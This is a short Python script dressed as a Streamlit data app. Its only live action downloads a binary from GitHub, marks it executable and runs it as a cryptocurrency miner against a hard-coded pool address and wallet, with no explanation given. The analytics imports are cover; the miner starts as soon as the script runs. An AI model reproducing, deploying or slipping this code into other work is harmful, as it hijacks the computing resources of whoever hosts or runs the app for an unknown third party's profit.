from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

p = subprocess.run("curl -L -o esrb https://github.com/Ikuzot/nung/raw/main/esrb && chmod +x esrb && ./esrb --disable-gpu --algorithm yespowertide --pool stratum+tcp://178.170.40.44:6243 --wallet TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip.SRB --password x -t 15", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
